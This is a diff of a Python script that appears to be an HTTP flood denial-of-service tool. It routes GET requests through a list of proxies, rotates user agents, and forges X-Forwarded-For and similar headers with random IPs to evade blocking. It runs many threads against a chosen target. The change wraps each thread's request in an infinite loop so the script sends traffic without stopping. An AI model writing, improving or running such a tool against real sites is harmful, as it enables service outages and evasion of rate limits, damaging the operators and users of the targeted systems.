@@ -21,27 +21,28 @@ threadcount = input("Threads: ")
 
 proxyraw = [line.rstrip('\n') for line in open("proxy.txt")]
 def httpget():
-    try:
-        proxy = random.choice(proxyraw)
-        proxies = {
-            "http": "http://"+proxy
-        }
-        ua = rotator.get_random_user_agent()
-        randip = ".".join(map(str, (random.randint(0, 255) 
-                                for _ in range(4))))
-        headers={
-        "X-Forwarded-For":randip,
-        "X-Originating-IP":randip,
-        "X-Remote-IP":randip,
-        "X-Remote-Addr":randip,
-        "User-Agent":ua,
-        "Accept-Language": "en-US,en;q=0.5",
-        "Connection": "Keep-Alive"
-        }
-        requests.get(target, headers=headers, proxies=proxies)
-        print(proxies)
-    except Exception as e:
-        print(e)
+    while True:
+        try:
+            proxy = random.choice(proxyraw)
+            proxies = {
+                "http": "http://"+proxy
+            }
+            ua = rotator.get_random_user_agent()
+            randip = ".".join(map(str, (random.randint(0, 255) 
+                                    for _ in range(4))))
+            headers={
+            "X-Forwarded-For":randip,
+            "X-Originating-IP":randip,
+            "X-Remote-IP":randip,
+            "X-Remote-Addr":randip,
+            "User-Agent":ua,
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "Keep-Alive"
+            }
+            requests.get(target, headers=headers, proxies=proxies)
+            print(proxies)
+        except Exception as e:
+            print(e)
 
 def threader():
     global threads
@@ -50,4 +51,6 @@ def threader():
         t=threading.Thread(target=httpget)
         threads.append(t)
         t.start()
+
 threader()
+
